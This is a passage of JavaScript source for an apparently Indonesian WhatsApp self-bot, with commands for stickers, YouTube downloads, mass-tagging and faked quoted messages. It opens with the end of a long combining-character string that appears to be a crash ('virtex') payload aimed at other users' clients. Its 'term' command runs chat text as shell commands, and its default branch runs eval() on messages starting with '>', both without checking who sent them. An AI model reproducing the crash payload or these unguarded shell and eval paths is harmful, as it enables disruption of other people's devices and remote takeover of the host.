⃙⃘⃪⃚⃪⃚⃙⃘⃙⃪⃚⃙⃪ࣰࣰࣰࣰࣰࣱࣱࣱࣱࣱࣲࣲࣲࣲࣲ᷐᷐᷐᷐᷎⃬⃭⃮⃯⃮⃭⃬⃬⃭⃮⃯⃨᷏᷏᷏᷏࣭࣭࣭ࣩࣹࣹࣺࣺࣶࣶ࣯࣯࣯࣮࣮ࣩࣩ⃡⃩⃔⃜⃕⃖⃖⃗⃑⃐⃡⃩⃔⃕⃖⃗⃜⃛⃩⃰⃰⃑⃐᷋᷄᷃᷃᷄᷅᷁᷁᷀᷉᷉᷁᷀᷉ᷖᷖᷕᷝᷞᷟᷧᷥᷤᷣᷬᷥᷫᷣᷢᷡᷘ᷑ᷚᷛᷜᷬᷴᷲᷰ᷵ᷧᷮᷬᷧᷞᷥᷜᷤᷛᷣᷕᷔᷓᷖᷖᷮ᷵ᷬᷴᷳᷚᷚᷘᷚᷓᷕᷔᷣᷗᷟᷥᷣᷤᷜᷓᷙᷘᷩᷖᷗᷟᷥᷬᷪᷠᷧᷭᷳᷰᷠᷪᷭᷯᷦᷤᷢᷟᷟᷗ᷇᷇ᷖᷞᷞࣥࣤࣤࣤࣤ࣬࣬࣬࣬࣬ࣴ࣬ࣳࣨࣸࣻࣳࣳࣳࣳࣼࣼࣼࣼࣽࣽࣽࣾࣾࣼࣼࣷࣷࣵࣾࣽࣼࣻࣳࣨ᷼᷍᷍᷍᷍᷍☠ֲֲֲֲࣦࣦࣦࣦࣦ֪֪֪֪֪֪֪֪ۣۣ֛֛֛֮֮̑̑̑̑̑̑̑̑̑̑̑̑̑҃҃҃҃҃҃҃҃҃҃҃҃ࣳࣾࣾࣾࣾࣾࣾࣾ݉݉݉݉࠙࠙ࣳࣳ⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃚⃙⃪⃘⃪⃙⃘⃚⃚⃙⃚⃚⃙⃪⃘⃚⃙⃪ࣰࣰࣱࣱࣱࣱࣲࣲࣲࣲ᷐⃭⃮⃯⃭⃬⃮⃯⃬⃭⃮⃯⃯⃮⃭⃯⃮⃯⃮⃭⃬⃯⃮⃭⃬ࣩࣹࣺࣶࣶ࣯ࣦࣩࣹࣹࣶ࣮࣯ࣶࣶ࣭࣮ࣶ࣮࣯࣮⃔⃔⃕⃖⃗⃜⃔⃗⃖⃕⃔⃜⃛⃗⃖⃕⃔⃜⃛⃑⃡⃩⃑⃐⃖⃕⃔⃜⃗⃖⃐⃑⃛⃜⃔⃡⃛⃜⃔⃕⃖⃗⃕⃖⃗⃡⃩⃜⃛⃔⃕⃖⃗⃜⃔⃡⃩᷁᷁᷀᷉᷉᷑ᷘᷙᷚᷛᷢᷣᷜᷡᷠᷩᷪᷰᷱᷲᷫᷤᷴᷫᷭᷳᷦᷟᷟᷜᷬᷦᷯᷦᷤ᷵ᷜᷣᷗᷝᷣᷥᷦᷭᷬᷩᷦᷤᷢᷧᷦ᷵ᷱᷣᷥᷞᷥࣳࣳࣳࣴ࣫࣪ࣨࣸࣻࣳࣳࣻࣴ࣫ࣳࣴࣼࣼࣽࣽࣽࣽࣼࣷࣵࣧࣧࣵࣴࣳࣼࣸࣳࣴࣵࣼࣴࣴࣳࣽࣥࣥࣥࣴࣴࣵࣵࣷʹ͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͙͙͙͙͙͙͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͛͛͛͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋ͭͭͭͫͫͫͫͭͫͭͫͭͤͤͣͤͭͫͭͤͣ`', quoted: ftroli})								
				break;
				case 'kak':
      case 'hidetag':
        if (!isGroupAdmins && !isOwner) return reply(`Bukan admin!`)
        var value = args.join(" ");
        var group = await client.groupMetadata(from);
        var member = group["participants"];
        var mem = [];
        member.map(async (adm) => {
          mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
        });
        var optionshidetag = {
          text: value,
          contextInfo: { mentionedJid: mem },
          quoted: mek,
        };
        client.sendMessage(from, optionshidetag, text);
        break;
      case "play":
        if (args.length === 0)
          return reply(
            `Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`
          );
        var srch = args.join("");
        aramas = await yts(srch);
        aramat = aramas.all;
        var mulaikah = aramat[0].url;
        try {
          yta(mulaikah).then((res) => {
            const { dl_link, thumb, title, filesizeF, filesize } = res;
            axios
              .get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
              .then(async (a) => {
                if (Number(filesize) >= 100000)
                  return sendMediaURL(
                    from,
                    thumb,
                    `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`
                  );
                const captions = `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`;
                sendMediaURL(from, thumb, captions);
                await sendMediaURL(from, dl_link).catch(() => reply("error"));
              });
          });
        } catch (err) {
          reply(mess.error.api);
        }
        break;
      case "video":
        if (args.length === 0)
          return reply(
            `Kirim perintah *${prefix}video* _Judul lagu yang akan dicari_`
          );
        var srch = args.join("");
        aramas = await yts(srch);
        aramat = aramas.all;
        var mulaikah = aramat[0].url;
        try {
          ytv(mulaikah).then((res) => {
            const { dl_link, thumb, title, filesizeF, filesize } = res;
            axios
              .get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
              .then(async (a) => {
                if (Number(filesize) >= 100000)
                  return sendMediaURL(
                    from,
                    thumb,
                    `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`
                  );
                const captions = `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`;
                sendMediaURL(from, thumb, captions);
                await sendMediaURL(from, dl_link).catch(() => reply("error"));
              });
          });
        } catch (err) {
          reply(mess.error.api);
        }
        break;       
      case "sticker":
      case "stiker":
      case "sg":
      case "s":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          const encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          const media = await client.downloadAndSaveMediaMessage(encmedia);
          ran = "666.webp";
          await ffmpeg(`./${media}`)
            .input(media)
            .on("start", function (cmd) {
              console.log(`Started : ${cmd}`);
            })
            .on("error", function (err) {
              console.log(`Error : ${err}`);
              fs.unlinkSync(media);
              reply("error");
            })
            .on("end", function () {
              console.log("Finish");
              client.sendMessage(from, fs.readFileSync(ran), sticker, {
                quoted: mek,
              });
              fs.unlinkSync(media);
              fs.unlinkSync(ran);
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(ran);
        } else if (
          ((isMedia && mek.message.videoMessage.seconds < 11) ||
            (isQuotedVideo &&
              mek.message.extendedTextMessage.contextInfo.quotedMessage
                .videoMessage.seconds < 11)) &&
          args.length == 0
        ) {
          const encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          const media = await client.downloadAndSaveMediaMessage(encmedia);
          ran = "999.webp";
          reply(mess.wait);
          await ffmpeg(`./${media}`)
            .inputFormat(media.split(".")[1])
            .on("start", function (cmd) {
              console.log(`Started : ${cmd}`);
            })
            .on("error", function (err) {
              console.log(`Error : ${err}`);
              fs.unlinkSync(media);
              tipe = media.endsWith(".mp4") ? "video" : "gif";
              reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`);
            })
            .on("end", function () {
              console.log("Finish");
              client.sendMessage(from, fs.readFileSync(ran), sticker, {
                quoted: mek,
              });
              fs.unlinkSync(media);
              fs.unlinkSync(ran);
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(ran);
        } else {
          reply(
            `Kirim gambar dengan caption ${prefix}sticker\nDurasi Sticker Video 1-9 Detik`
          );
        }
        break;
      case "toimg":
        if (!isQuotedSticker) return reply("𝗥𝗲𝗽𝗹𝘆/𝘁𝗮𝗴 𝘀𝘁𝗶𝗰𝗸𝗲𝗿 !");
        reply(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await client.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".png");
        exec(`ffmpeg -i ${media} ${ran}`, (err) => {
          fs.unlinkSync(media);
          if (err) return reply("Yah gagal, coba ulangi ^_^");
          buffer = fs.readFileSync(ran);
          fakethumb(buffer, "NIH");
          fs.unlinkSync(ran);
        });
        break;                
        case 'tovid': case 'tovideo':
if (!isQuotedSticker) return reply('Reply stiker nya')
if (mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated == true)
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.xtInfo
media = await client.downloadAndSaveMediaMessage(encmedia)
memek = await webp2gifFile(media)
console.log(memek)
sendMediaURL(from, memek.result, 'Nih..')
break;						
case 'togif':
if (!isQuotedSticker) return reply('Reply stiker nya')
if (mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated == true)
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await client.downloadAndSaveMediaMessage(encmedia)
memek = await webp2gifFile(media)
console.log(memek)
anu = await getBuffer(memek.result)
client.sendMessage(from, anu, video, {mimetype: 'video/gif', caption: 'Nih..', quoted: mek})
break;
      case "ytsearch":
        if (args.length < 1) return reply("Tolong masukan query!");
        var srch = args.join("");
        try {
          var aramas = await yts(srch);
        } catch {
          return await client.sendMessage(
            from,
            "Error!",
            MessageType.text,
            dload
          );
        }
        aramat = aramas.all;
        var tbuff = await getBuffer(aramat[0].image);
        var ytresult = "";
        ytresult += "「 *YOUTUBE SEARCH* 」";
        ytresult += "\n________________________\n\n";
        aramas.all.map((video) => {
          ytresult += "❏ Title: " + video.title + "\n";
          ytresult += "❏ Link: " + video.url + "\n";
          ytresult += "❏ Durasi: " + video.timestamp + "\n";
          ytresult +=
            "❏ Upload: " + video.ago + "\n________________________\n\n";
        });
        ytresult += "◩ *SELF-BOT*";
        await fakethumb(tbuff, ytresult);
        break;
      case "setreply":
      case "setfake":
        if (!q) return fakegroup(mess.wrongFormat);
        fake = q;
        fakegroup(`Succes Mengganti Conversation Fake : ${q}`);
        break;
      case "setfakeimg":
        if (
          ((isMedia && !mek.message.videoMessage) ||
            isQuotedImage ||
            isQuotedSticker) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedSticker
              ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                  .extendedTextMessage.contextInfo
              : mek;
          delb = await client.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/fake.jpeg`, delb);
          fakestatus("Sukses");
        } else {
          reply(`Kirim gambar dengan caption ${prefix}sethumb`);
        }
        break;
      case "setthumb":
	  if (!mek.key.fromMe) return fakestatus("SELF-BOT");
        if (
          ((isMedia && !mek.message.videoMessage) ||
            isQuotedImage ||
            isQuotedSticker) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedSticker
              ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                  .extendedTextMessage.contextInfo
              : mek;
          delb = await client.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/thumb.jpeg`, delb);
          fakestatus("Sukses");
        } else {
          reply(`Kirim gambar dengan caption ${prefix}sethumb`);
        }
        break;
      case "ytmp4":
        if (args.length === 0)
          return reply(`Kirim perintah *${prefix}ytmp4 [linkYt]*`);
        let isLinks2 = args[0].match(
          /(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/
        );
        if (!isLinks2) return reply(mess.error.Iv);
        try {
          reply(mess.wait);
          ytv(args[0]).then((res) => {
            const { dl_link, thumb, title, filesizeF, filesize } = res;
            axios
              .get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
              .then((a) => {
                if (Number(filesize) >= 40000)
                  return sendMediaURL(
                    from,
                    thumb,
                    `*YTMP 4!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`
                  );
                const captionsYtmp4 = `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`;
                sendMediaURL(from, thumb, captionsYtmp4);
                sendMediaURL(from, dl_link).catch(() => reply(mess.error.api));
              });
          });
        } catch (err) {
          reply(mess.error.api);
        }
        break;
      case "emoji":
        if (!q) return fakegroup("emojinya?");
        qes = args.join(" ");
        emoji.get(`${qes}`).then((emoji) => {
          teks = `${emoji.images[4].url}`;
          sendStickerFromUrl(from, `${teks}`);
          console.log(teks);
        });
        break;
      case "ytmp3":
        if (args.length === 0)
          return reply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`);
        let isLinks = args[0].match(
          /(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/
        );
        if (!isLinks) return reply(mess.error.Iv);
        try {
          reply(mess.wait);
          yta(args[0]).then((res) => {
            const { dl_link, thumb, title, filesizeF, filesize } = res;
            axios
              .get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
              .then((a) => {
                if (Number(filesize) >= 30000)
                  return sendMediaURL(
                    from,
                    thumb,
                    `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`
                  );
                const captions = `*YTMP3*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`;
                sendMediaURL(from, thumb, captions);
                sendMediaURL(from, dl_link).catch(() => reply(mess.error.api));
              });
          });
        } catch (err) {
          reply(mess.error.api);
        }
        break;
      case "image":
      case "gimage":
      case "googleimage":
        if (args.length < 1) return reply("Apa Yang Mau Dicari?");
        reply(mess.wait);
        teks = args.join(" ");
        res = await gis(teks, google);
        function google(error, result) {
          if (error) {
            return reply(
              "_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_"
            );
          } else {
            gugIm = result;
            random = gugIm[Math.floor(Math.random() * gugIm.length)].url;
            sendMediaURL(from, random);
          }
        }
        break;

      case "brainly":
        if (args.length < 1) return reply("Pertanyaan apa");
        brien = args.join(" ");
        brainly(`${brien}`).then((res) => {
          teks = "❉───────────────────────❉\n";
          for (let Y of res.data) {
            teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`;
          }
          client.sendMessage(from, teks, text, {
            quoted: mek,
            detectLinks: false,
          });
        });
        break;     
      case "fb":
        if (!q) return reply("Linknya?");
        if (!isUrl(args[0]) && !args[0].includes("facebook.com"))
          return reply(mess.Iv);
        reply(mess.wait);
        te = args.join(" ");
        hx.fbdown(`${te}`).then((G) => {
          ten = `${G.HD}`;
          sendMediaURL(from, ten, `*Link video_normal* : ${G.Normal_video}`);
        });
        break;
      case "term":
        if (!q) return fakegroup(mess.wrongFormat);
        exec(q, (err, stdout) => {
          if (err) return fakegroup(`SELF-BOT:~ ${err}`);
          if (stdout) {
            fakegroup(stdout);
          }
        });
        break;
      case "join":
        try {
          if (!isUrl(args[0]) && !args[0].includes("whatsapp.com"))
            return reply(mess.Iv);
          hen = args[0];
          if (!q) return fakestatus("Masukan link group");
          var codeInvite = hen.split("https://chat.whatsapp.com/")[1];
          if (!codeInvite) return fakegroup("pastikan link sudah mekar!");
          var response = await client.acceptInvite(codeInvite);
          fakestatus("SUKSES");
        } catch {
          fakegroup("LINK ERROR!");
        }
        break;
      case "runtime":
      case "test":
        run = process.uptime();
        teks = `${kyun(run)}`;
        fakegroup(teks);
        break;
      case "speed":
      case "ping":
        const timestamp = speed();
        const latensi = speed() - timestamp;
        exec(`neofetch --stdout`, (error, stdout, stderr) => {
          const child = stdout.toString("utf-8");
          const ssd = child.replace(/Memory:/, "Ram:");
          const pingnya = `*${ssd}Speed: ${latensi.toFixed(4)} Second*`;
          fakegroup(pingnya);
        });
        break;
      case "totag":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          encmedia = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await client.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await client.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          client.sendMessage(from, ini_buffer, sticker, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await client.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await client.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          client.sendMessage(from, ini_buffer, image, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedAudio) &&
          args.length == 0
        ) {
          encmedia = isQuotedAudio
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await client.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await client.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "audio/mp4",
            ptt: true,
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          client.sendMessage(from, ini_buffer, audio, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedVideo) &&
          args.length == 0
        ) {
          encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await client.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await client.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "video/mp4",
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          client.sendMessage(from, ini_buffer, video, options);
          fs.unlinkSync(file);
        } else {
          reply(
            `reply gambar/sticker/audio/video dengan caption ${prefix}totag`
          );
        }
        break;
      case "tomp4":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          ger = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await client.downloadAndSaveMediaMessage(ger);
          webp2mp4File(owgi).then((res) => {
            sendMediaURL(from, res.result, "Done");
          });
        } else {
          reply("reply stiker");
        }
        fs.unlinkSync(owgi);
        break;
      case "tourl":
        if (
          ((isMedia && !mek.message.videoMessage) ||
            isQuotedImage ||
            isQuotedVideo) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedVideo
              ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                  .extendedTextMessage.contextInfo
              : mek;
          owgi = await client.downloadMediaMessage(boij);
          res = await upload(owgi);
          reply(res);
        } else {
          reply("kirim/reply gambar/video");
        }
        break;
      case "inspect":
        try {
          if (!isUrl(args[0]) && !args[0].includes("whatsapp.com"))
            return reply(mess.Iv);
          if (!q) return reply("masukan link wa");
          cos = args[0];
          var net = cos.split("https://chat.whatsapp.com/")[1];
          if (!net) return reply("pastikan itu link https://whatsapp.com/");
          jids = [];
          let {
            id,
            owner,
            subject,
            subjectOwner,
            desc,
            descId,
            participants,
            size,
            descOwner,
            descTime,
            creation,
          } = await client.query({
            json: ["query", "invite", net],
            expect200: true,
          });
          let par = `*Id* : ${id}
${owner ? `*Owner* : @${owner.split("@")[0]}` : "*Owner* : -"}
*Nama Gc* : ${subject}
*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
*Jumlah Member* : ${size}
${desc ? `*Desc* : ${desc}` : "*Desc* : tidak ada"}
*Id desc* : ${descId}
${
  descOwner
    ? `*Desc diubah oleh* : @${descOwner.split("@")[0]}`
    : "*Desc diubah oleh* : -"
}\n*Tanggal* : ${
            descTime ? `${formatDate(descTime * 1000)}` : "-"
          }\n\n*Kontak yang tersimpan*\n`;
          for (let y of participants) {
            par += `> @${y.id.split("@")[0]}\n*Admin* : ${
              y.isAdmin ? "Ya" : "Tidak"
            }\n`;
            jids.push(`${y.id.replace(/@c.us/g, "@s.whatsapp.net")}`);
          }
          jids.push(
            `${owner ? `${owner.replace(/@c.us/g, "@s.whatsapp.net")}` : "-"}`
          );
          jids.push(
            `${
              descOwner
                ? `${descOwner.replace(/@c.us/g, "@s.whatsapp.net")}`
                : "-"
            }`
          );
          client.sendMessage(from, par, text, {
            quoted: mek,
            contextInfo: { mentionedJid: jids },
          });
        } catch {
          reply("Link error");
        }
        break;
      case "eval":
        if (!mek.key.fromMe) return;
        client.sendMessage(
          from,
          JSON.stringify(eval(budy.slice(5)), null, "\t"),
          text,
          { quoted: mek }
        );
        break;
      default:
        if (_chats.startsWith(">")) {
          try {
            return client.sendMessage(
              from,
              JSON.stringify(eval(budy.slice(2)), null, "\t"),
              text,
              { quoted: mek }
            );
          } catch (err) {
            e = String(err);
            reply(e);
          }
        }
    }

    if (isGroup && budy != undefined) {
    } else {
      console.log(
        color("[TEXT]", "red"),
        "SELF-MODE",
        color(sender.split("@")[0])
      );
    }
  } catch (e) {
    e = String(e);
    if (!e.includes("c.isZero") && !e.includes("jid")) {
      console.log("Message : %s", color(e, "green"));
    }
    // console.log(e)
  }
};
